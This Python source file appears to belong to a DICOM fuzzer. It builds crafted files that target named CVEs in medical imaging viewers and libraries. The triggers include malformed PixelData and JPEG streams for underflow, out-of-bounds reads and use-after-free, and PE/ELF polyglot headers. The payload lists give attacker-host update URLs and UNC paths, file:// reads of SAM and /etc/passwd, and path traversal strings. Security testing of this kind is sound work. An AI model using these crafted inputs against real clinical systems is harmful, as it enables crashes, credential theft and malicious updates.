"""Protocol and Parser CVE Mutations - Deterministic.

Each function returns a list of (variant_name, mutated_bytes) tuples.
All variants are generated deterministically - no random selection.
"""

from __future__ import annotations

import struct


def mutate_cve_2025_11266(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2025-11266: GDCM integer underflow in encapsulated PixelData fragments.

    Returns variants:
    - underflow: Fragment with 0xFFFFFFFF length
    - fragment_count_mismatch: Offset table claims more fragments than exist
    """
    variants = []

    pixel_data_tag = b"\xe0\x7f\x10\x00"
    item_tag = b"\xfe\xff\x00\xe0"
    seq_delim = b"\xfe\xff\xdd\xe0"

    # Variant 1: Integer underflow trigger
    malicious_encap = (
        pixel_data_tag
        + b"OB\x00\x00"
        + b"\xff\xff\xff\xff"
        + item_tag
        + b"\x00\x00\x00\x00"
        + item_tag
        + struct.pack("<I", 0xFFFFFFFF)  # Underflow trigger
        + b"\xff" * 16
        + item_tag
        + b"\x00\x00\x00\x00"
        + seq_delim
        + b"\x00\x00\x00\x00"
    )
    result = bytearray(data)
    idx = data.find(pixel_data_tag)
    if idx == -1:
        # No PixelData -- append encapsulated payload
        result = result[:-4] + malicious_encap + result[-4:]
    else:
        # Replace existing PixelData with malicious encapsulated version
        result = result[:idx] + malicious_encap + result[-4:]

    variants.append(("integer_underflow", bytes(result)))

    # Variant 2: Fragment count mismatch
    malicious = (
        pixel_data_tag
        + b"OB\x00\x00"
        + b"\xff\xff\xff\xff"
        + item_tag
        + struct.pack("<I", 40)  # Claims 10 fragments
        + struct.pack("<I", 0) * 10
        + item_tag
        + struct.pack("<I", 8)  # But only 1 actual fragment
        + b"\x00" * 8
        + seq_delim
        + b"\x00\x00\x00\x00"
    )
    result2 = bytearray(data)
    result2 = result2[:-4] + malicious + result2[-4:]
    variants.append(("fragment_count_mismatch", bytes(result2)))

    return variants


def mutate_cve_2025_53618(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2025-53618: GDCM JPEG codec OOB read via malformed Huffman tables.

    Returns variant with crafted JPEG containing invalid Huffman table.
    """
    soi = b"\xff\xd8"
    eoi = b"\xff\xd9"
    sof0 = b"\xff\xc0"
    dht = b"\xff\xc4"
    sos = b"\xff\xda"

    malformed_jpeg = (
        soi
        + sof0
        + struct.pack(">H", 11)
        + b"\x08"
        + struct.pack(">H", 0xFFFF)
        + struct.pack(">H", 0xFFFF)
        + b"\x01"
        + b"\x01\x11\x00"
        + dht
        + struct.pack(">H", 5)  # Length too short
        + b"\x00"
        + b"\xff\xff"  # Invalid counts
        + sos
        + struct.pack(">H", 8)
        + b"\x01"
        + b"\x01\x00"
        + b"\x00\x3f\x00"
        + b"\x00" * 4
        + eoi
    )

    pixel_data_tag = b"\xe0\x7f\x10\x00"
    item_tag = b"\xfe\xff\x00\xe0"
    seq_delim = b"\xfe\xff\xdd\xe0"

    encapsulated = (
        pixel_data_tag
        + b"OB\x00\x00"
        + b"\xff\xff\xff\xff"
        + item_tag
        + b"\x00\x00\x00\x00"
        + item_tag
        + struct.pack("<I", len(malformed_jpeg))
        + malformed_jpeg
        + seq_delim
        + b"\x00\x00\x00\x00"
    )

    result = bytearray(data)
    result = result[:-4] + encapsulated + result[-4:]

    return [("jpeg_huffman_oob_read", bytes(result))]


def mutate_cve_2025_53619(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2025-53619: GDCM JPEG stream truncation causing OOB read.

    Returns variant with truncated JPEG stream (no EOI marker).
    """
    truncated_jpeg = (
        b"\xff\xd8"  # SOI
        b"\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"  # APP0
        b"\xff\xdb\x00\x43\x00"  # DQT header
        + b"\x10" * 64  # Quantization table
        + b"\xff\xc0\x00\x0b\x08\x00\x10\x00\x10\x01\x01\x11\x00"  # SOF0
        + b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00"  # SOS header
        # No scan data or EOI - truncated
    )

    pixel_data_tag = b"\xe0\x7f\x10\x00"
    item_tag = b"\xfe\xff\x00\xe0"
    seq_delim = b"\xfe\xff\xdd\xe0"

    encapsulated = (
        pixel_data_tag
        + b"OB\x00\x00"
        + b"\xff\xff\xff\xff"
        + item_tag
        + b"\x00\x00\x00\x00"
        + item_tag
        + struct.pack("<I", len(truncated_jpeg))
        + truncated_jpeg
        + seq_delim
        + b"\x00\x00\x00\x00"
    )

    result = bytearray(data)
    result = result[:-4] + encapsulated + result[-4:]

    return [("jpeg_truncated_stream", bytes(result))]


def mutate_cve_2025_1001(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2025-1001: RadiAnt certificate validation bypass (MITM).

    Returns all variants with different malicious update URLs.
    """
    variants = []

    update_payloads = [
        (b"https://attacker.com/DicomViewer_Update.exe", "attacker_domain"),
        (b"http://localhost:8080/malicious_update.msi", "localhost_bypass"),
        (b"\\\\evil.com\\updates\\viewer.exe", "unc_path"),
        (
            b"https://update.legitimate-domain.com.attacker.com/update",
            "subdomain_spoof",
        ),
        (b"https://DicomViewer.com@attacker.com/update.exe", "url_userinfo"),
    ]

    institution_addr_tag = b"\x08\x00\x81\x00"
    station_name_tag = b"\x08\x00\x10\x10"
    software_tag = b"\x18\x00\x20\x10"

    for payload, variant_name in update_payloads:
        result = bytearray(data)

        injected = False
        for tag in [institution_addr_tag, station_name_tag]:
            idx = data.find(tag)
            if idx != -1 and idx + 8 < len(result):
                result[idx + 6 : idx + 8] = struct.pack("<H", len(payload))
                injected = True
                break

        if not injected:
            insert_pos = min(250, len(result) - 4)
            element = software_tag + b"LO" + struct.pack("<H", len(payload)) + payload
            result = result[:insert_pos] + element + result[insert_pos:]

        variants.append((f"cert_bypass_{variant_name}", bytes(result)))

    return variants


def mutate_cve_2025_1002(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2025-1002: MicroDicom certificate verification bypass (MITM).

    Returns all variants with different MITM URL payloads.
    """
    variants = []

    mitm_urls = [
        (b"https://attacker.example.com/wado", "attacker_wado"),
        (b"https://self-signed.badssl.com/dicom", "self_signed"),
        (b"https://expired.badssl.com/dicom", "expired_cert"),
        (b"https://wrong.host.badssl.com/dicom", "wrong_host"),
        (b"https://untrusted-root.badssl.com/dicom", "untrusted_root"),
        (b"https://127.0.0.1:8080/dicom", "localhost_ipv4"),
        (b"https://[::1]:8080/dicom", "localhost_ipv6"),
    ]

    retrieve_url_tag = b"\x08\x00\x90\x11"
    institution_tag = b"\x08\x00\x81\x00"

    for url, variant_name in mitm_urls:
        result = bytearray(data)

        # Pad to even length
        mitm_url = url + (b" " if len(url) % 2 else b"")

        for tag in [retrieve_url_tag, institution_tag]:
            idx = data.find(tag)
            if idx != -1 and idx + 8 < len(result):
                result[idx + 6 : idx + 8] = struct.pack("<H", len(mitm_url))

        if data.find(retrieve_url_tag) == -1:
            insert_pos = min(200, len(result) - 4)
            url_element = (
                retrieve_url_tag + b"UR" + struct.pack("<H", len(mitm_url)) + mitm_url
            )
            result = result[:insert_pos] + url_element + result[insert_pos:]

        variants.append((f"mitm_{variant_name}", bytes(result)))

    return variants


def mutate_cve_2025_27578(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2025-27578: OsiriX MD use-after-free via DICOM upload.

    Returns variant with malformed sequence causing UAF.
    """
    result = bytearray(data)

    sq_tag = b"\x08\x00\x15\x11"
    item_start = b"\xfe\xff\x00\xe0"
    item_end = b"\xfe\xff\x0d\xe0"
    seq_delim = b"\xfe\xff\xdd\xe0"

    uaf_sequence = (
        sq_tag
        + b"SQ\x00\x00"
        + b"\xff\xff\xff\xff"
        + item_start
        + struct.pack("<I", 8)
        + b"\x00" * 8
        + item_start
        + b"\xff\xff\xff\xff"
        # Premature sequence end without item end
        + seq_delim
        + b"\x00\x00\x00\x00"
        + b"\x08\x00\x16\x00"
        + b"UI"
        + struct.pack("<H", 26)
        + b"1.2.840.10008.5.1.4.1.1.2"
        + b"\x00"
    )

    idx = data.find(sq_tag)
    if idx != -1:
        item_idx = result.find(item_end, idx)
        if item_idx != -1:
            result[item_idx : item_idx + 4] = b"\x00\x00\x00\x00"

    result = result[:-4] + uaf_sequence + result[-4:]

    return [("use_after_free_remote", bytes(result))]


def mutate_cve_2025_31946(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2025-31946: OsiriX MD local use-after-free via import.

    Returns variant with malformed PixelData causing UAF.
    """
    result = bytearray(data)

    pixel_data_tag = b"\xe0\x7f\x10\x00"
    item_tag = b"\xfe\xff\x00\xe0"
    seq_delim = b"\xfe\xff\xdd\xe0"

    uaf_pixel_data = (
        pixel_data_tag
        + b"OW\x00\x00"
        + b"\xff\xff\xff\xff"
        + item_tag
        + struct.pack("<I", 16)
        + struct.pack("<I", 0)  # Valid offset
        + struct.pack("<I", 0xFFFFFFFF)  # Invalid offset (UAF trigger)
        + struct.pack("<I", 0x80000000)  # Large offset
        + struct.pack("<I", 0xDEADBEEF)  # Marker
        + item_tag
        + struct.pack("<I", 4)
        + b"\x00\x00\x00\x00"
        + seq_delim
        + b"\x00\x00\x00\x00"
    )

    idx = data.find(pixel_data_tag)
    if idx != -1:
        if idx + 12 < len(result):
            result[idx + 8 : idx + 12] = b"\xff\xff\xff\xff"
    else:
        result = result[:-4] + uaf_pixel_data + result[-4:]

    return [("use_after_free_local", bytes(result))]


def mutate_cve_2024_33606(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2024-33606: MicroDicom URL scheme security bypass.

    Returns all variants with different malicious URL schemes.
    """
    variants = []

    url_payloads = [
        (b"file:///C:/Windows/System32/config/SAM", "file_windows"),
        (b"file://localhost/etc/passwd", "file_unix"),
        (b"\\\\attacker.com\\share\\payload.exe", "unc_path"),
        (b"http://127.0.0.1:8080/../../etc/passwd", "traversal"),
        (b"javascript:alert(1)", "javascript"),
        (b"data:text/html,<script>alert(1)</script>", "data_uri"),
        (b"file:///proc/self/environ", "proc_environ"),
        (b"dict://attacker:11111/", "dict_scheme"),
        (b"gopher://attacker:70/_", "gopher_scheme"),
        (b"ldap://attacker/exploit", "ldap_scheme"),
    ]

    retrieve_url_tag = b"\x08\x00\x90\x11"
    retrieve_uri_tag = b"\x40\x00\x10\xe0"

    for payload, variant_name in url_payloads:
        result = bytearray(data)

        for tag in [retrieve_url_tag, retrieve_uri_tag]:
            idx = data.find(tag)
            if idx != -1 and idx + 8 < len(result):
                result[idx + 6 : idx + 8] = struct.pack("<H", len(payload))
                result = result[: idx + 8] + payload + result[idx + 8 + len(payload) :]
                break
        else:
            insert_pos = min(300, len(result) - 4)
            url_element = (
                retrieve_url_tag + b"UR" + struct.pack("<H", len(payload)) + payload
            )
            result = result[:insert_pos] + url_element + result[insert_pos:]

        variants.append((f"url_scheme_{variant_name}", bytes(result)))

    return variants


def mutate_cve_2022_24193(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2022-24193: OsiriX DoS via deep sequence nesting.

    Returns variants with different nesting depths.
    """
    variants = []

    item_start = b"\xfe\xff\x00\xe0"
    item_end = b"\xfe\xff\x0d\xe0"

    nesting_depths = [
        (100, "depth_100"),
        (250, "depth_250"),
        (500, "depth_500"),
    ]

    for depth, variant_name in nesting_depths:
        result = bytearray(data)

        nested = b""
        for _ in range(depth):
            nested = (
                item_start
                + b"\xff\xff\xff\xff"
                + nested
                + item_end
                + b"\x00\x00\x00\x00"
            )

        sq_tag = b"\x08\x00\x05\x11"
        idx = data.find(sq_tag)
        if idx != -1:
            result = result[: idx + 4] + nested + result[idx + 4 :]
        else:
            result = result[:-4] + nested + result[-4:]

        variants.append((f"deep_nesting_{variant_name}", bytes(result)))

    return variants


def mutate_cve_2021_41946(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2021-41946: ClearCanvas path traversal via filename injection.

    Returns all variants with different path traversal payloads.
    """
    variants = []

    payloads = [
        (b"../../../etc/passwd", "unix_relative"),
        (b"..\\..\\..\\windows\\system32\\config\\sam", "windows_relative"),
        (b"/etc/passwd", "unix_absolute"),
        (b"\\\\server\\share\\file", "unc_path"),
        (b"file:///etc/passwd", "file_uri"),
        (b"....//....//....//etc/passwd", "double_encoded"),
        (b"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "url_encoded"),
    ]

    ref_file_tag = b"\x04\x00\x00\x15"

    for payload, variant_name in payloads:
        result = bytearray(data)
        idx = data.find(ref_file_tag)

        if idx != -1 and idx + 8 < len(result):
            vr_length_offset = idx + 4
            if vr_length_offset + 4 < len(result):
                result[vr_length_offset + 2 : vr_length_offset + 4] = struct.pack(
                    "<H", len(payload)
                )
                result = (
                    result[: vr_length_offset + 4]
                    + payload
                    + result[vr_length_offset + 4 + len(payload) :]
                )
        else:
            insert_pos = min(200, len(result) - 4)
            element = ref_file_tag + b"LO" + struct.pack("<H", len(payload)) + payload
            result = result[:insert_pos] + element + result[insert_pos:]

        variants.append((f"path_traversal_{variant_name}", bytes(result)))

    return variants


def mutate_cve_2020_29625(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2020-29625: DCMTK DoS via undefined length fields.

    Returns variants:
    - undefined_length: Sets 0xFFFFFFFF in non-sequence VR lengths
    - oversized_length: Sets length larger than remaining file
    """
    variants = []

    # Variant 1: Undefined length
    result = bytearray(data)
    vr_patterns = [b"OB", b"OW", b"OF", b"SQ", b"UN", b"UC", b"UR", b"UT"]

    for vr in vr_patterns:
        idx = 0
        while True:
            idx = result.find(vr, idx)
            if idx == -1:
                break
            if idx >= 4 and idx + 6 < len(result):
                result[idx + 2 : idx + 6] = b"\xff\xff\xff\xff"
                break  # Only modify first occurrence
            idx += 1

    variants.append(("undefined_length", bytes(result)))

    # Variant 2: Oversized length
    result2 = bytearray(data)
    for i in range(len(result2) - 8):
        if result2[i : i + 2] in [b"OB", b"OW", b"SQ", b"UN"]:
            if i + 6 < len(result2):
                remaining = len(result2) - i
                oversized = remaining * 2
                result2[i + 4 : i + 8] = struct.pack("<I", oversized)
                break

    variants.append(("oversized_length", bytes(result2)))

    return variants


def mutate_cve_2019_11687(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2019-11687: DICOM preamble polyglot (PE/ELF executable in DICOM).

    Returns variants:
    - pe_polyglot: PE header in preamble (Windows executable)
    - elf_polyglot: ELF header in preamble (Linux executable)
    """
    variants = []

    if len(data) < 132:
        return [("error_file_too_small", data)]

    # Variant 1: PE polyglot
    pe_header = (
        b"MZ"  # DOS signature
        + b"\x90" * 58  # DOS header padding
        + struct.pack("<I", 0x80)  # PE header offset
        + b"\x00" * 64  # Padding
    )
    result_pe = bytearray(data)
    result_pe[: len(pe_header)] = pe_header[:128]
    variants.append(("pe_polyglot", bytes(result_pe)))

    # Variant 2: ELF polyglot
    elf_header = (
        b"\x7fELF"  # ELF magic
        + b"\x01"  # 32-bit
        + b"\x01"  # Little endian
        + b"\x01"  # ELF version
        + b"\x00" * 9  # Padding
        + struct.pack("<H", 2)  # ET_EXEC
        + struct.pack("<H", 3)  # EM_386
        + struct.pack("<I", 1)  # EV_CURRENT
        + b"\x00" * 100  # Rest of header
    )
    result_elf = bytearray(data)
    result_elf[: min(len(elf_header), 128)] = elf_header[:128]
    variants.append(("elf_polyglot", bytes(result_elf)))

    return variants
